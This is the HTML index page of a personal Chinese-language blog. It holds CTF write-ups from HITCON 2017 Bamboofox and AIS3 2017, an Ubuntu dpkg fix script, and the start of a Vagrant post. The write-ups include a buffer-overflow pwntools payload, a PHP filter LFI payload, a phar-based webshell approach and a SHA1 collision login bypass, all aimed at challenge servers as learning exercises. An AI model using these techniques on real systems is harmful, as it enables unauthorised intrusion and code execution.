@@ -1,0 +1,1263 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <meta charset="utf-8">
+    
+    <title>Racter&#39;s Blogs</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Writeups &amp; Diaries">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Racter&#39;s Blogs">
+<meta property="og:url" content="https://racterub.com.tw/index.html">
+<meta property="og:site_name" content="Racter&#39;s Blogs">
+<meta property="og:description" content="Writeups &amp; Diaries">
+<meta property="og:locale" content="zh-TW">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Racter&#39;s Blogs">
+<meta name="twitter:description" content="Writeups &amp; Diaries">
+    
+
+    
+
+    
+        <link rel="icon" href="/favicon.ico" />
+    
+
+    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/libs/open-sans/styles.css">
+    <link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <script src="/libs/jquery/2.1.3/jquery.min.js"></script>
+    
+    
+        <link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+    
+    
+        <link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+    
+    
+        <script type="text/javascript">
+(function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-87186808-2', 'auto');
+ga('send', 'pageview');
+
+</script>
+    
+    
+    
+
+
+</head>
+
+<body>
+    <div id="container">
+        <header id="header">
+    <div id="header-main" class="header-inner">
+        <div class="outer">
+            <a href="/" id="logo">
+                <i class="logo"></i>
+                <span class="site-title">Racter&#39;s Blogs</span>
+            </a>
+            <nav id="main-nav">
+                
+                    <a class="main-nav-link" href="/">Home</a>
+                
+                    <a class="main-nav-link" href="/archives">Archives</a>
+                
+                    <a class="main-nav-link" href="/categories">Categories</a>
+                
+                    <a class="main-nav-link" href="/tags">Tags</a>
+                
+                    <a class="main-nav-link" href="/about">About</a>
+                
+            </nav>
+            
+                
+                <nav id="sub-nav">
+                    <div class="profile" id="profile-nav">
+                        <a id="profile-anchor" href="javascript:;">
+                            <img class="avatar" src="/head.jpg" />
+                            <i class="fa fa-caret-down"></i>
+                        </a>
+                    </div>
+                </nav>
+            
+            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="搜尋" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: 'Pages',
+            CATEGORIES: '分類',
+            TAGS: '標籤',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div>
+        </div>
+    </div>
+    <div id="main-nav-mobile" class="header-sub header-inner">
+        <table class="menu outer">
+            <tr>
+                
+                    <td><a class="main-nav-link" href="/">Home</a></td>
+                
+                    <td><a class="main-nav-link" href="/archives">Archives</a></td>
+                
+                    <td><a class="main-nav-link" href="/categories">Categories</a></td>
+                
+                    <td><a class="main-nav-link" href="/tags">Tags</a></td>
+                
+                    <td><a class="main-nav-link" href="/about">About</a></td>
+                
+                <td>
+                    
+    <div class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="搜尋" />
+    </div>
+
+                </td>
+            </tr>
+        </table>
+    </div>
+</header>
+
+        <div class="outer">
+            
+                
+
+<aside id="profile">
+    <div class="inner profile-inner">
+        <div class="base-info profile-block">
+            <img id="avatar" src="/head.jpg" />
+            <h2 id="name">Racter Liu</h2>
+            <h3 id="title">CTFer, Noob in CTF</h3>
+            <span id="location"><i class="fa fa-map-marker"></i>Taoyuan, Taiwan</span>
+            <a id="follow" target="_blank" href="https://github.com/james50428/">關注我</a>
+        </div>
+        <div class="article-info profile-block">
+            <div class="article-info-block">
+                6
+                <span>文章</span>
+            </div>
+            <div class="article-info-block">
+                10
+                <span>標籤</span>
+            </div>
+        </div>
+        
+        <div class="profile-block social-links">
+            <table>
+                <tr>
+                    
+                    
+                    <td>
+                        <a href="http://github.com/james50428" target="_blank" title="github" class=tooltip>
+                            <i class="fa fa-github"></i>
+                        </a>
+                    </td>
+                    
+                    <td>
+                        <a href="https://www.facebook.com/racterub" target="_blank" title="facebook" class=tooltip>
+                            <i class="fa fa-facebook"></i>
+                        </a>
+                    </td>
+                    
+                    <td>
+                        <a href="https://www.instagram.com/racterub/" target="_blank" title="instagram" class=tooltip>
+                            <i class="fa fa-instagram"></i>
+                        </a>
+                    </td>
+                    
+                </tr>
+            </table>
+        </div>
+        
+    </div>
+</aside>
+
+            
+            <section id="main">
+    <article id="post-hitcon2017-bamboofox" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+    
+        <h1 itemprop="name">
+            <a class="article-title" href="/zh-tw/hitcon2017-bamboofox/">HITCON2017-Bamboofox Wargame</a>
+        </h1>
+    
+
+                
+                    <div class="article-meta">
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/zh-tw/hitcon2017-bamboofox/">
+            <time datetime="2017-08-25T23:02:43.000Z" itemprop="datePublished">2017-08-25</time>
+        </a>
+    </div>
+
+
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/Write-up/">Write-up</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/Write-up/hitcon2017CMT/">hitcon2017CMT</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/Write-up/hitcon2017CMT/bamboofox/">bamboofox</a>
+    </div>
+
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/bamboofox/">bamboofox</a>, <a class="tag-link" href="/tags/hitcon2017/">hitcon2017</a>
+    </div>
+
+                    </div>
+                
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+            
+            <p>只解出兩題, 剩下的因為我太廢不會繞保護所以沒解QQ</p>
+<h2 id="Forensic-100"><a href="#Forensic-100" class="headerlink" title="Forensic [100]"></a>Forensic [100]</h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">聽說他被裁剪過，不過好像不是用正規的圖片編輯軟體處理的，真是的...怎麼裁剪的這麼暴力...</div><div class="line">拜託了，幫我把旗子找出來，不然...</div><div class="line">等等有人來了...快躲起來...</div><div class="line">( 瀏覽器上面瀏覽可能是黑的，建議載下來看喔 )</div></pre></td></tr></table></figure>
+<p>題目檔: <a href="../../static/file/height_is_weird.zip">Height_is_weird</a></p>
+<p>這題題目已經提示要改圖片高度所以在hexeditor中找到png的寬高設定 <a href="http://www.w3.org/TR/PNG/#11IHDR" target="_blank" rel="external">png格式說明書</a><br>所以把高增加到想要的高度(in HEX)<br>然後再用pngcheck把CRC重新算一遍再更正就可以囉</p>
+<h2 id="Pwn-100"><a href="#Pwn-100" class="headerlink" title="Pwn [100]"></a>Pwn [100]</h2><h3 id="Description-1"><a href="#Description-1" class="headerlink" title="Description:"></a>Description:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">nc bamboofox.cs.nctu.edu.tw 22001</div><div class="line"></div><div class="line">FLAG 在 /home/ctf 底下</div><div class="line"></div><div class="line">歡迎來到 PWN 的世界</div><div class="line">恩...這題就是 buffer overflow 的基礎簡單入門題</div><div class="line">有哪邊不會可以來我們在 HITCON 的攤位問問題喔</div><div class="line">會的人應該 1 分鐘就解完了吧?</div><div class="line">恩我廢話好多喔...</div><div class="line">總之就是想辦法拿到 FLAG 吧</div></pre></td></tr></table></figure>
+<p>主辦方很佛心地給了src<br>題目檔: <a href="../../static/file/binary_100.c">binary100.c</a> <a href="../../static/file/binary_100">binary100</a></p>
+<p>這題題目很好心的給了原始碼 <del>那就不開gdb了</del></p>
+<p>這題題目是考<code>LIFO+BOF</code><br>在記憶體裡長這樣:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">+----------------+</div><div class="line">|                |</div><div class="line">|                |</div><div class="line">|      text      |  &lt;-- text&apos;s buffer (40byte)</div><div class="line">|                |</div><div class="line">|                |</div><div class="line">| -------------- |</div><div class="line">| to_be_overflow |  &lt;-- to_be_overflow&apos;s pointer</div><div class="line">+----------------+</div></pre></td></tr></table></figure></p>
+<p>在程式中<code>to_be_overflow</code>必須等於<code>0xABCD1234</code>才有shell<br>所以只要在text的buffer塞滿垃圾, 在把<code>to_be_overflow</code>蓋掉直接變成<code>0xABCD1234</code>就可以取得shell</p>
+<p>所以payload會長這樣:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">r = remote(<span class="string">'bamboofox.cs.nctu.edu.tw'</span>, <span class="string">'22001'</span>)</div><div class="line"></div><div class="line">r.sendline(<span class="string">'A'</span>*<span class="number">40</span> + <span class="string">'\x34\x12\xCD\xAB'</span>)</div><div class="line"></div><div class="line">r.interactive()</div></pre></td></tr></table></figure></p>
+
+        
+        </div>
+        <footer class="article-footer">
+            <div class="share-container">
+
+
+
+</div>
+
+    <a data-url="https://racterub.com.tw/zh-tw/hitcon2017-bamboofox/" data-id="cj8hctxgg0009dz36cj82plz5" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+<script>
+    (function ($) {
+        // Prevent duplicate binding
+        if (typeof(__SHARE_BUTTON_BINDED__) === 'undefined' || !__SHARE_BUTTON_BINDED__) {
+            __SHARE_BUTTON_BINDED__ = true;
+        } else {
+            return;
+        }
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="fa fa-twitter article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="fa fa-facebook article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="fa fa-pinterest article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="fa fa-google article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+            
+    
+        <a href="https://racterub.com.tw/zh-tw/hitcon2017-bamboofox/#comments" class="article-comment-link disqus-comment-count" data-disqus-url="https://racterub.com.tw/zh-tw/hitcon2017-bamboofox/">評論</a>
+    
+
+        </footer>
+    </div>
+    
+</article>
+
+
+
+    <article id="post-ubuntu-fixes" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+    
+        <h1 itemprop="name">
+            <a class="article-title" href="/zh-tw/ubuntu-fixes/">Ubuntu-Fixes</a>
+        </h1>
+    
+
+                
+                    <div class="article-meta">
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/zh-tw/ubuntu-fixes/">
+            <time datetime="2017-08-13T13:02:20.000Z" itemprop="datePublished">2017-08-13</time>
+        </a>
+    </div>
+
+
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/Linux/">Linux</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/Linux/Ubuntu/">Ubuntu</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/Linux/Ubuntu/Bugfix/">Bugfix</a>
+    </div>
+
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/Linux/">Linux</a>, <a class="tag-link" href="/tags/Ubuntu/">Ubuntu</a>
+    </div>
+
+                    </div>
+                
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+            
+            <p>最近在更新軟體包的時候出現<code>files list file for package &#39;xxx&#39; is missing final newline</code>的錯誤<br>解法:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 8th November, 2009</span></div><div class="line"><span class="comment"># update manager failed, giving me the error:</span></div><div class="line"><span class="comment">#       'files list file for package 'xxx' is missing final newline' for every package.</span></div><div class="line"><span class="comment"># some Googling revealed that this problem was due to corrupt files(s) in /var/lib/dpkg/info/</span></div><div class="line"><span class="comment"># looping though those files revealed that some did not have a final new line</span></div><div class="line"><span class="comment"># this script will resolve that problem by appending a newline to all files that are missing it</span></div><div class="line"><span class="comment"># <span class="doctag">NOTE:</span> you will need to run this script as root, e.g. sudo python newline_fixer.py</span></div><div class="line"><span class="comment"># http://ubuntuforums.org/showthread.php?t=1319791</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line">dpkg_path = <span class="string">'/var/lib/dpkg/info/'</span></div><div class="line">paths = os.listdir(dpkg_path)</div><div class="line"><span class="keyword">for</span> path <span class="keyword">in</span> paths:</div><div class="line">    path = dpkg_path + path</div><div class="line">    f = open(path, <span class="string">'a+'</span>)</div><div class="line">    data = f.read()</div><div class="line">    <span class="keyword">if</span> len(data) &gt; <span class="number">1</span> <span class="keyword">and</span> data[<span class="number">-1</span>:] != <span class="string">'\n'</span>:</div><div class="line">        f.write(<span class="string">'\n'</span>)</div><div class="line">        <span class="keyword">print</span> <span class="string">'added newline character to:'</span>, path</div><div class="line">    f.close()</div></pre></td></tr></table></figure><br><a href="https://gist.github.com/gautric/8c7ee5380ea216acf1f9" target="_blank" rel="external">(Gist Source)</a></p>
+<blockquote>
+<p>Updated at 2017.08.13</p>
+</blockquote>
+
+        
+        </div>
+        <footer class="article-footer">
+            <div class="share-container">
+
+
+
+</div>
+
+    <a data-url="https://racterub.com.tw/zh-tw/ubuntu-fixes/" data-id="cj8hctxgi000adz36xab07zkg" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+<script>
+    (function ($) {
+        // Prevent duplicate binding
+        if (typeof(__SHARE_BUTTON_BINDED__) === 'undefined' || !__SHARE_BUTTON_BINDED__) {
+            __SHARE_BUTTON_BINDED__ = true;
+        } else {
+            return;
+        }
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="fa fa-twitter article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="fa fa-facebook article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="fa fa-pinterest article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="fa fa-google article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+            
+    
+        <a href="https://racterub.com.tw/zh-tw/ubuntu-fixes/#comments" class="article-comment-link disqus-comment-count" data-disqus-url="https://racterub.com.tw/zh-tw/ubuntu-fixes/">評論</a>
+    
+
+        </footer>
+    </div>
+    
+</article>
+
+
+
+    <article id="post-ais3-2017" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+    
+        <h1 itemprop="name">
+            <a class="article-title" href="/zh-tw/ais3-2017/">AIS3 Pre-Exam 2017</a>
+        </h1>
+    
+
+                
+                    <div class="article-meta">
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/zh-tw/ais3-2017/">
+            <time datetime="2017-07-13T15:12:36.000Z" itemprop="datePublished">2017-07-13</time>
+        </a>
+    </div>
+
+
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/Write-up/">Write-up</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/Write-up/AIS3/">AIS3</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/Write-up/AIS3/2017/">2017</a>
+    </div>
+
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/AIS3/">AIS3</a>, <a class="tag-link" href="/tags/Writeu-up/">Writeu-up</a>
+    </div>
+
+                    </div>
+                
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+            
+            <p>這次是我第一次玩AIS3 Pre-Exam,難度沒有特別難<del>以web來說拉</del>.<br>解題的時候有卡了一下下<del>實際上是一整天</del><br>以下是有解出來的write-up</p>
+<p><code>FLAG和題目大多都忘記保存了QQ,所以這篇只寫出想法和大概解法QQ</code></p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="MISC1"><a href="#MISC1" class="headerlink" title="MISC1"></a>MISC1</h2><p>只是個簽到題</p>
+<h2 id="MISC2"><a href="#MISC2" class="headerlink" title="MISC2"></a>MISC2</h2><p><del>這題的出題者給我出來QQ, 這花了我快一天的時間QQ</del><br>題目只寫了頁面<code>I&#39;ve sent you something :)</code><br>一開始看原始碼一看就看到<code>&lt;!-- &lt;img src=sudodu.png /&gt; --&gt;</code><br>一開始的只覺得應該是個Stego題<br>結果不論是用<code>exiftool</code>, <code>binwalk</code>, <code>strings</code>都沒有出現任何特別的地方<br>直到有一次無聊喵了一下看到header發現有傳了一串類似以base64編碼的字串<br>解出來後的確是base64編碼的,結果是一個資料夾, 資料夾裡面有一張照片<br>下載下來即可發現FLAG<br>FLAG = <code>AIS3{pika}</code></p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h2><p>題目只寫了<code>Didn&#39;t You See The Flag?</code><br>用curl就會噴FLAG了</p>
+<h2 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h2><p>題目為一個登入畫面,DB已經寫死在Source Code裡了<br>看了一下Source Code是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">md5(%password) == $row[<span class="string">'password'</span>]</div></pre></td></tr></table></figure><br>後來Google了一下,發現是PHP<code>==</code>的一些問題<br>(<a href="http://momomoxiaoxi.com/2016/07/07/CTFWeb/#2-md5碰撞" target="_blank" rel="external">Source</a>)<br>(<a href="http://www.nobbd.de/blog/artikel.php?titel=write-up-Internetwache-CTF-2016---All-5-web-challenges" target="_blank" rel="external">CTF實例</a>)<br>並且在DB找到了MD5編碼開頭為0e的密碼<br>所以以0e編碼的明碼再加上相對應的username就可以取得flag</p>
+<h2 id="WEB3-amp-WEB4"><a href="#WEB3-amp-WEB4" class="headerlink" title="WEB3 &amp; WEB4"></a>WEB3 &amp; WEB4</h2><p>兩個是同一個網站</p>
+<h3 id="WEB3-Flag1"><a href="#WEB3-Flag1" class="headerlink" title="WEB3(Flag1)"></a>WEB3(Flag1)</h3><p>看了一下發現好像有LFI的漏洞<br>就開始不斷的猜flag的位置<br><del>猜了快一天</del><br>才發現就在index<br><code>PAYLOAD = $domain/?p=php://filter/convert.base64-encode/resource=index</code></p>
+<h3 id="WEB4-Flag2"><a href="#WEB4-Flag2" class="headerlink" title="WEB4(Flag2)"></a>WEB4(Flag2)</h3><p>看了一下index的內容<br>發現Flag2的線索<br>有個<code>uploaddddddd</code>的頁面<br>發現可能是要上傳webshell<br>但是不論怎麼試都不行過(改content-type, 雙副檔名)<br>後來才知道要用phar的協定<br>壓縮webshell成zip檔,改附檔名成.jpg,利用LFI+phar執行webshell<br><code>the_flag2_which_the_filename_you_can_not_guess_without_getting_the_shellllllll1l</code> 這個頁面就放flag<br>進去一看就可以看到Flag2</p>
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="CRYPTO-3"><a href="#CRYPTO-3" class="headerlink" title="CRYPTO 3"></a>CRYPTO 3</h2><p>程式碼:<code>(我不會寫php code QQ(意思有到就好))</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">h1 = $_POST[<span class="string">"username"</span>]</div><div class="line">h2 = $_POST[<span class="string">"password"</span>]</div><div class="line"><span class="keyword">if</span> h1 = h2;</div><div class="line">    <span class="keyword">die</span> $flag</div></pre></td></tr></table></figure><br>直覺就是SHA1 Collision<br><a href="https://shattered.io/" target="_blank" rel="external">(Source)</a><br>在網路上改一下script就會噴出flag了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line">rotimi = urllib2.urlopen(<span class="string">"http://shattered.io/static/shattered-1.pdf"</span>).read()[:<span class="number">500</span>]</div><div class="line">letmein = urllib2.urlopen(<span class="string">"http://shattered.io/static/shattered-2.pdf"</span>).read()[:<span class="number">500</span>]</div><div class="line">payload = &#123;<span class="string">'username'</span>: rotimi, <span class="string">'password'</span>: letmein&#125;</div><div class="line">r = requests.post(<span class="string">'https://quiz.ais3.org:32670'</span>, data=payload)</div><div class="line"><span class="keyword">print</span> r.text</div></pre></td></tr></table></figure></p>
+<h1 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h1><p>這次AIS3的初體驗我覺得挺好玩的<br><del>雖然只有127名QQ</del><br>因為自己Reverse跟pwn的底子還不夠,所以打完web跟misc就不繼續打了<br>明年希望自己能夠給力點QQ</p>
+
+        
+        </div>
+        <footer class="article-footer">
+            <div class="share-container">
+
+
+
+</div>
+
+    <a data-url="https://racterub.com.tw/zh-tw/ais3-2017/" data-id="cj8hctxg60008dz36i7ny28o3" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+<script>
+    (function ($) {
+        // Prevent duplicate binding
+        if (typeof(__SHARE_BUTTON_BINDED__) === 'undefined' || !__SHARE_BUTTON_BINDED__) {
+            __SHARE_BUTTON_BINDED__ = true;
+        } else {
+            return;
+        }
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="fa fa-twitter article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="fa fa-facebook article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="fa fa-pinterest article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="fa fa-google article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+            
+    
+        <a href="https://racterub.com.tw/zh-tw/ais3-2017/#comments" class="article-comment-link disqus-comment-count" data-disqus-url="https://racterub.com.tw/zh-tw/ais3-2017/">評論</a>
+    
+
+        </footer>
+    </div>
+    
+</article>
+
+
+
+    <article id="post-vagrant-windows" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+    
+        <h1 itemprop="name">
+            <a class="article-title" href="/zh-tw/vagrant-windows/">Vagrant-Windows</a>
+        </h1>
+    
+
+                
+                    <div class="article-meta">
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/zh-tw/vagrant-windows/">
+            <time datetime="2017-05-24T14:03:38.000Z" itemprop="datePublished">2017-05-24</time>
+        </a>
+    </div>
+
+
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/Enviroment/">Enviroment</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/Enviroment/Vagrant/">Vagrant</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/Enviroment/Vagrant/Windows/">Windows</a>
+    </div>
+
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/Vagrant/">Vagrant</a>, <a class="tag-link" href="/tags/VirtualBox/">VirtualBox</a>
+    </div>
+
+                    </div>
+                
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+            
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>本篇僅針對Windows教學,其他系統請去煩作者叫他生出來</code></p>
